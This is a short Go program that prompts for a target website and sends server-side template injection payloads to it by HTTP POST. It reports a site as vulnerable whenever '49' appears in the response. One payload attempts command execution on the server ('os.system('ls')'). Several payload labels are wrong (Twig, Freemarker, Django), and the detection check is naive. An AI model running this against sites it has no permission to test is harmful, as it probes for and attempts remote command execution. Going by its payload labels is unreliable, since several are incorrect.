package main

import (
    "bufio"
    "fmt"
    "io/ioutil"
    "net/http"
    "os"
    "strings"
)

func main() {
    // Prompt the user to enter the target website URL
    fmt.Print("Enter your target website URL: ")
    scanner := bufio.NewScanner(os.Stdin)
    scanner.Scan()
    url := scanner.Text()

    // Payloads to test for Server-Side Template Injection vulnerability
    payloads := []string{
        "{{ 7 * 7 }}",                         // Jinja2
        "${7*7}",                              // Velocity
        "<%= 7 * 7 %>",                        // EJS
        "<% out.println(7*7); %>",             // JSP
        "<% 7 * 7 %>",                         // Freemarker
        "{{{ 7*7 }}}",                         // Handlebars
        "{{ '7*7' }}",                         // Django
        "{% set x = '7*7' %}{{ x }}",          // Twig
        "{% import os %}{{ os.system('ls') }}",// Twig (Command Execution)
    }

    // Perform SSTI vulnerability testing with each payload
    vulnerable := false
    for _, payload := range payloads {
        // Send HTTP request with payload
        resp, err := http.Post(url, "text/plain", strings.NewReader(payload))
        if err != nil {
            fmt.Println("Error sending request:", err)
            continue
        }
        defer resp.Body.Close()

        // Check the response status code
        if resp.StatusCode != http.StatusOK {
            fmt.Println("Error: Unexpected status code:", resp.StatusCode)
            continue
        }

        // Read response body
        body, err := ioutil.ReadAll(resp.Body)
        if err != nil {
            fmt.Println("Error reading response:", err)
            continue
        }

        // Analyze response for evidence of SSTI vulnerability
        // Example: Check if response contains result of 7*7 calculation
        if strings.Contains(string(body), "49") {
            fmt.Printf("Vulnerable to SSTI with payload: %s\n", payload)
            vulnerable = true
            // If a vulnerability is found, you can choose to break out of the loop here
            // break
        }
    }

    // Check if no vulnerabilities were found
    if !vulnerable {
        fmt.Println("Not vulnerable to SSTI")
    }
}
